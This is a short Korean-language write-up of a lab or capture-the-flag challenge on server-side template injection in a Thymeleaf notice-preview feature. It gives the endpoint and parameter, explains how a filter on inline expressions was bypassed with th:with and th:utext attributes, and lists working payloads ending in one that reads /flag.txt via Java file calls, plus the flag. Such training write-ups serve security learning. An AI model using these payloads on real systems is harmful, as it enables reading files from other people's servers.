[SSTI 6번 풀이]

1. 공격 과정
   - 블로그 관리 → 공지 → 공지 HTML 미리보기 기능 확인
   - [[${7*7}]] 입력 → ${7*7} 출력으로 필터링 확인
   - [[TEST]], [(TEST)] 입력 → TEST 출력으로 인라인 표현식 구분자 제거 확인
   - th 속성 사용 시 미리보기 생성 실패
   - th="${7*7 == 49}" → SUCCESS 출력 & th="${7*7 == 50}" → 출력되지 않음
   - th와 th를 조합해 49 출력 성공
   - Files.exists()로 /flag.txt 파일 존재 확인
   - Files.readString()으로 파일 내용을 읽어 FLAG 획득

2. 공격 URL 및 파라미터
   - URL: POST https://lab.eqst.co.kr:8445/practice06/api/v1/notice-previews
   - Parameter: sourceHtml

3. 필터링 및 우회 방식
   - [[...]], [(...)] 형태의 인라인 표현식 구분자 제거
   - th 속성 사용 시 오류 발생
   - th, th 속성은 정상 실행
   - 인라인 표현식 필터링을 HTML 속성 기반 표현식으로 우회

4. 공격 구문
   - SSTI 확인: <p th:if="${7*7 == 49}">SUCCESS</p>
   - 속성 기반 실행 확인: <p th:with="result=${7*7}" th:utext="${result}">TEST</p>
   - 최종 파일 읽기: <p th:with="result=${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/flag.txt'))}" th:utext="${result}">TEST</p>

5. 정답
FLAG{th_attr_filter_bypass_482056ed}
